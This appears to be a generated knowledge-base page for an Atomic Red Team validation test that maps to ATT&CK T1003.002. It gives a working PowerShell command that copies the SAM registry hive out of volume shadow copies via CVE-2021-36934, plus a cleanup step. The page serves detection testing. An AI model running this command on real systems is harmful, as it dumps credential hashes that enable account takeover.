---
atomic_guid: "9d77fed7-05f8-476e-a81b-8ff0472c64d0"
title: "dump volume shadow copy hives with System.IO.File"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.002"
attack_technique_name: "OS Credential Dumping: Security Account Manager"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.yaml"
build_date: "2026-04-27 19:12:25"
executor: "powershell"
aliases:
  - "9d77fed7-05f8-476e-a81b-8ff0472c64d0"
  - "dump volume shadow copy hives with System.IO.File"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping#^t1003002-security-account-manager|T1003.002: Security Account Manager]]

## Input Arguments

### limit

- description: Limit to the number of shadow copies to iterate through when trying to copy the hive
- type: integer
- default: 10

### target_hive

- description: Hive you wish to dump
- type: string
- default: SAM

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
1..#{limit} | % { 
 try { [System.IO.File]::Copy("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\#{target_hive}" , "$env:TEMP\#{target_hive}vss$_", "true") } catch {}
 ls "$env:TEMP\#{target_hive}vss$_" -ErrorAction Ignore
}
```

### Cleanup

```powershell
1..#{limit} | % {
  rm "$env:TEMP\#{target_hive}vss$_" -ErrorAction Ignore
}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.yaml)
